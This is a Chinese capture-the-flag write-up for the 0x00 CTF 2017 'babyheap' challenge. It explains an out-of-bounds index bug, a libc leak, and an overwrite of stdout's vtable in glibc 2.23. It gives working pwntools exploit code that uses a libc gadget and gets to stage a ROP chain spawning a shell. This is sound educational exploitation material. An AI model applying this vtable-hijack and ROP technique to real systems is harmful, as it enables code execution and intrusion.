@@ -1,0 +1,184 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="fcd132a41144e9a9b99c8c38725439ae">前言</h1>
+<p>本文以  <code>0x00 CTF 2017</code> 的 <code>babyheap</code> 为例介绍下通过修改 <code>vtable</code> 进行 <code>rop</code> 的操作 (:-_-</p>
+<p>相关文件位于</p>
+<pre><code>https://gitee.com/hac425/blog_data/tree/master/0x00ctf</code></pre>
+<h1 data-content="1" id="4a2023157225e0ac1e3f876bf62f728c">漏洞分析</h1>
+<p>首先查看一下程序开启的安全措施</p>
+<pre><code>18:07 haclh@ubuntu:0x00ctf $ checksec ./babyheap
+[*] '/home/haclh/workplace/0x00ctf/babyheap'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE</code></pre>
+<p>没开 <code>PIE</code> 。</p>
+<p>接下来看看程序</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212655-267ec152-4c7a-1.png"/></p>
+<p>对程序功能做个介绍</p>
+<ul>
+<li>程序一开始需要用户往 <code>bss</code> 段的 <code>name</code> 缓冲区输入内容</li>
+<li>
+<code>add</code>  函数: 增加一个 <code>user</code>, 其实就是根据需要的大小使用 <code>malloc</code> 分配内存， 然后读入 <code>username</code>.</li>
+<li>
+<code>edit</code> 函数: 根据输入的 <code>index</code> ， 取出指针， 往里面写入内容。 <strong><code>index</code> 没有校验</strong>。</li>
+<li>
+<code>ban</code> 函数:  <code>free</code> 掉一个 <code>user</code>.</li>
+<li>
+<code>changename</code> 函数: 修改 <code>bss</code> 段的 <code>name</code>
+</li>
+</ul>
+<ul>
+<li>输入为 <code>5</code> 时， 会打印 <code>read</code> 函数的地址， 这样就可以拿到 <code>libc</code> 的基地址了。</li>
+</ul>
+<p>来看看 <code>edit</code> 函数</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212655-2693ecee-4c7a-1.png"/></p>
+<p>直接使用我们输入的数字作为数组索引，在  <code>users</code> 数组中取到 <code>obj</code> 指针，然后使用 <code>strlen</code> 获取输入的长度，最后调用 <code>read</code> 往 <code>obj</code> 里面写内容。</p>
+<p>如果我们输入的数字大于 <code>users</code> 数组的长度就可以读取  <code>users</code> 数组 外面的数据作为 <code>read</code> 读取数据的指针了。</p>
+<p>下面来看看 <code>bss</code> 段的布局</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212655-26a293f2-4c7a-1.png"/></p>
+<p>我们可以看到 <code>users</code> 后面就是 <code>name</code> 缓冲区， <code>name</code> 的内容我们可控， 于是利用 <code>edit</code> 函数里面的 <strong>越界读</strong> 漏洞，我们就可以伪造 <code>obj</code> 指针， 然后在 通过  <code>read</code> 读取数据时 就可以往 <code>obj</code> 指针处写东西， <strong>任意地址写</strong></p>
+<h1 data-content="1" id="aa8987f54f383c855b8302d6b41d9d2c">漏洞利用</h1>
+<h2 data-content="1" id="9c66ba330566b8c0a8e3af6246737911">控制rip</h2>
+<p>整理一下现在拥有的能力。</p>
+<ul>
+<li>通过 <strong>选项5</strong> 可以 <code>leak</code> 出 <code>libc</code> 的地址</li>
+<li>通过 <code>edit</code> 和 <code>changename</code> 可以实现任意地址写</li>
+</ul>
+<p>题目给的 <code>libc</code> 是 <code>2.23</code>，没有虚表保护，于是选择改 <code>stdout</code> 的虚表指针，这样我们就可以伪造 <code>stdout</code> 的虚表，然后在调用虚表的时候，就可以控制 <code>rip</code> 了。</p>
+<p>我们知道  <code>stdout</code>  是 <code>_IO_FILE_plus</code> 类型，大小为 <code>0xe0</code> ， 最后 <code>8</code> 个字节是 <code>vtable</code> （即 <code>stdout+0xd8</code> 处）， 类型是<code>struct  _IO_jump_t</code> 。</p>
+<pre><code>pwndbg&gt; p/x sizeof(struct _IO_FILE_plus )
+$8 = 0xe0
+pwndbg&gt; p ((struct _IO_FILE_plus*)stdout)-&gt;vtable 
+$9 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;
+pwndbg&gt; p/x sizeof(struct _IO_jump_t )
+$10 = 0xa8
+pwndbg&gt;</code></pre>
+<p>我们不能 <code>leak</code> 堆的地址，伪造虚表只能在 <code>name</code> 缓冲区内伪造，<code>name</code> 缓冲区的大小为 <code>0x28</code> , 而 虚表（<code>struct _IO_jump_t</code>）的大小 为 <code>0xa8</code>  ， 所以是不能伪造整个虚表的， 不过我们只需要把虚表中接下来会被调用的项的指针改了就行了 。有点绕，直接调试看。</p>
+<p>首先使用选项5的函数， <code>leak</code> 出 <code>libc</code> 的基地址</p>
+<pre><code># 首先利用 gift 泄露 libc
+choice(5)
+p.recvuntil("your gift:\n")
+libc.address = int(p.recvline().strip()) - libc.symbols['read']
+stdout_vtable_addr = libc.symbols['_IO_2_1_stdout_'] + 0xd8   #  IO_2_1_stdout-&gt;vtable 的地址</code></pre>
+<p>然后我们在 <code>name</code> 缓冲区内布置好内容，让 越界读 使用</p>
+<pre><code># 在 name buf 布置数据
+choice(4)
+payload = ""
+payload += p64(stdout_vtable_addr)  # 修改虚表指针
+payload += cyclic(0x28 - len(payload))
+p.sendafter("enter new name:", payload)</code></pre>
+<p>数据布置好了以后，利用 <code>edit</code> 里面的越界读漏洞，进行任意地址写， 修改 <code>IO_2_1_stdout-&gt;vtable</code> 为 <code>name</code> 缓冲区的地址</p>
+<pre><code>bss_name = 0x6020A0  # bss name 缓冲区的地址
+
+# 利用 越界 获取指针的漏洞进行任意地址写
+choice(2)
+p.sendlineafter("2. insecure edit", "2")
+sleep(0.1)
+p.sendlineafter("index: ", '12')   # index 12 ---&gt; 会从 name 缓冲区开始处取8字节作为指针
+sleep(0.1)
+payload = p64(bss_name) # 修改 vtable 的值， 把 vtable 改成 bss_name
+p.sendafter("new username: ", payload[:6])   # 修改的数据， 把虚表改到 bss .</code></pre>
+<p>使用 <code>ida</code> 可以看到 <code>users</code> 数组的起始地址为 <code>0x0602040</code> , <code>name</code> 缓冲区的地址 为 <code>0x006020a0</code>。 所以</p>
+<pre><code>(0x006020a0-0x00602040)/8 = 12</code></pre>
+<p>这样一来就会把 <code>name</code> 缓冲区开始 的 <code>8</code> 个字节作为 <code>user</code> 指针对其进行内容修改。而在之前我们已经布局好 <code>name</code> ，使得 <code>name</code> 缓冲区开始 的 <code>8</code> 个字节 为  <code>IO_2_1_stdout-&gt;vtable</code> 的地址，这样在后面设置 <code>new username</code> 时 就可以修改   <code>IO_2_1_stdout-&gt;vtable</code>  了。</p>
+<p>然后输入 <code>new username</code> 为 <code>p64(bss_name)</code> 前 <code>6</code> 字节 ， 就可以修改   <code>IO_2_1_stdout-&gt;vtable</code> 为 <code>name</code> 缓冲区的地址。</p>
+<blockquote>
+<p>只发送前 6 个字节的原因是</p>
+<pre><code>len = strlen(obj);</code></pre>
+<p>长度是用 <code>strlen</code> 获取的， <code>IO_2_1_stdout-&gt;vtable</code>  原来的值是  <code>libc</code>  的地址开始的 <code>6</code> 个字节是非 <code>\x00</code>， 所以 <code>strlen</code> 会返回 <code>6</code>。</p>
+</blockquote>
+<p>接下来使用到 <code>stdout</code> 时，就会用到伪造的 虚表 （<code>name</code> 缓冲区）</p>
+<p>调试看看， 会发现 <code>crash</code> 了</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212655-26c00220-4c7a-1.png"/></p>
+<p>这里没有破坏栈的数据，所以栈回溯应该是正确的，所以看看栈回溯</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212655-26d3a79e-4c7a-1.png"/></p>
+<p>可以看到 <code>call [$rax + 0x38]</code> ， 然后 <code>$rax</code> 是 <code>name</code> 缓冲区的地址</p>
+<p>所以现在 $rax 的值我们可控， 只需要使得  rax + 0x38 也可控即可</p>
+<pre><code>$rax  = bss_name - 0x18
+ $rax + 0x38 ---&gt; bss_name + 0x20</code></pre>
+<p>这样一来就可以控制 <code>rip</code> 了。</p>
+<h2 data-content="1" id="82ca28a4ec6536259eead8d7defacb86">getshell</h2>
+<h3 data-content="1" id="0753c7363ae8f1f877f818fa16fa2161">思路分析</h3>
+<p>可以控制 <code>rip</code> 后， 同时还有 <code>libc</code> 的地址 <code>one_gadget</code> 可以试一试，不过这东西看运气，在这个题就不能用。这里我们使用 <code>rop</code> 来搞。</p>
+<p>要进行 <code>rop</code>  首先得控制栈的数据，现在 <code>rax</code> 是我们可控的，一般的思路就是利用 <code>xchg rax,rsp</code> 之类的 <code>gadget</code> 来迁移栈到我们可控的地方，这里采取另外一种方式， <strong>利用 <code>libc</code> 的代码片段 ，直接往栈里面写数据, 布置  rop 链</strong>。</p>
+<p>首先来分析下要用到的 <code>gadget</code></p>
+<p>位于 <code>authnone_create-0x35</code> 处</p>
+<pre><code>.text:000000000012B82B                 mov     rdi, rsp        ; gadget start
+.text:000000000012B82E                 call    qword ptr [rax+20h]
+.text:000000000012B831                 mov     cs:dword_3C8D9C, eax
+.text:000000000012B837                 mov     rax, [rsp+38h+var_30]
+.text:000000000012B83C                 mov     rax, [rax+38h]
+.text:000000000012B840                 test    rax, rax
+.text:000000000012B843                 jz      short loc_12B84A
+.text:000000000012B845                 mov     rdi, rsp
+.text:000000000012B848                 call    rax
+.text:000000000012B84A
+.text:000000000012B84A loc_12B84A:                             ; CODE XREF: sub_12B7A0+A3↑j
+.text:000000000012B84A                 add     rsp, 30h
+.text:000000000012B84E                 pop     rbx
+.text:000000000012B84F                 retn</code></pre>
+<p>可以看到 首先</p>
+<pre><code>rdi = rsp
+call    qword ptr [rax+20h]</code></pre>
+<p>这样只要然后 <code>rax+0x20</code> 为 <code>gets</code> 函数的地址，就可以往 栈里面写数据了。</p>
+<blockquote>
+<p>开始以为 gets 函数会读到 \x00 终止，后来发现不是, 函数定义</p>
+<pre><code>gets 函数从流中读取字符串，直到出现换行符或读到EOF为止，最后加上NULL作为字符串结束</code></pre>
+<p><code>EOF</code> 貌似是 <code>-1</code> ，所以我们可以读入 <code>\x00</code> ，而且输入数据的长度还是我们可控的 （通过控制 <code>\n</code> ）</p>
+</blockquote>
+<p>此时已经可以覆盖返回地址了，下面就是让 上面的代码块 执行完 gets 后进入 loc_12B84A ， 分支。</p>
+<p>执行完  <code>call    qword ptr [rax+20h]</code>  后，会从   <code>esp+8</code>   处取出 <code>8</code> 字节放到 <code>rax</code> ，然后判断 <code>rax+0x38</code> 处存放的值是不是 <code>0</code> ， 如果为 <code>0</code>, 就可以进入 <code>loc_12B84A</code> 进行 <code>rop</code> 了 .</p>
+<pre><code>.text:000000000012B831                 mov     cs:dword_3C8D9C, eax
+.text:000000000012B837                 mov     rax, [rsp+38h+var_30]
+.text:000000000012B83C                 mov     rax, [rax+38h]
+.text:000000000012B840                 test    rax, rax
+.text:000000000012B843                 jz      short loc_12B84A</code></pre>
+<h3 data-content="1" id="f9d9d1d173f8ace0c6d26f682f7f94f7">exp分析</h3>
+<p>整理一下，分析分析最终的 <code>exp</code></p>
+<p>首先 <code>leak</code> 处 <code>libc</code> 的地址，获取到后面需要的一些 <code>gadget</code> 的地址</p>
+<p>然后往 <code>name</code> 缓冲区布置数据</p>
+<pre><code># 在 name buf 布置数据
+choice(4)
+payload = ""
+payload += p64(stdout_vtable_addr)  # 修改虚表指针
+payload += p64(libc.symbols['gets']) # rip for call    qword ptr [rax+20h]
+payload += "b" *  0x10 # padding
+payload += p64(gadget)      # mov     rdi, rsp        ; gadget start 的地址
+payload += cyclic(0x28 - len(payload))
+p.sendafter("enter new name:", payload)</code></pre>
+<p>然后往触发漏洞，修改 <code>_IO_2_1_stdout_-&gt;vtable</code> 为 <code>bss_name - 0x18</code></p>
+<pre><code># 利用 越界 获取指针的漏洞进行任意地址写
+choice(2)
+p.sendlineafter("2. insecure edit", "2")
+sleep(0.1)
+p.sendlineafter("index: ", '12')   # index 12 ---&gt; 会从 name 开始处取8字节作为指针
+sleep(0.1)
+payload = p64(bss_name - 0x18) # padding for let 
+p.sendafter("new username: ", payload[:6])   # 修改的数据， 把虚表改到 bss .
+info("_IO_2_1_stdout_-&gt;vtable({})---&gt; bss_name".format(hex(stdout_vtable_addr)))
+# gdb.attach(p)
+pause()</code></pre>
+<p>这就使得 接下来 <code>call [eax + 0x38]</code> 会变成  <code>call [name+0x20]</code> ， 也就是 进入 <code>gadget</code> 。</p>
+<p>会调用  <code>call    qword ptr [rax+20h]</code>  ，其实就是   <code>call [name+0x8]</code>   ， 之前已经设置为 <code>gets</code> 函数的地址，所以会调用 <code>gets</code></p>
+<pre><code>pop_rdi_ret = 0x0000000000400f13
+
+# zero addr
+zero_addr = 0x6020c8  #  该位置的值为 p64(0)
+info("zero_addr: " + hex(zero_addr))
+payload = 'a' * 8
+payload += p64(zero_addr - 0x38)
+payload += cyclic(40)
+payload += p64(pop_rdi_ret)
+payload += p64(sh_addr)
+payload += p64(libc.symbols['system'])
+p.sendline(payload)</code></pre>
+<p>然后通过 <code>gets</code> 往栈里面布置数据， 把 <code>rsp+8</code> 设置为 <code>zero_addr</code> （该位置的值为 <code>p64(0)</code>），然后 <code>rop</code> 调用 <code>system("sh")</code> 即可</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180430212655-26e9fa76-4c7a-1.png"/></p>
+<h1 data-content="1" id="875aacd7753da8a94a757dbb60e94e52">总结</h1>
+<p><code>authnone_create-0x35</code> 处的这个 <code>gadget</code> 还是比较有趣的，以后能控制 <code>rax</code> 处的内容 时可以选择用这种方式（比较稳定）, 比如可以修改 虚表指针时。</p>
+<p><strong>参考</strong></p>
+<p><a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/babyheap-200" target="_blank">https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/babyheap-200</a></p>
+</div>
+</div>
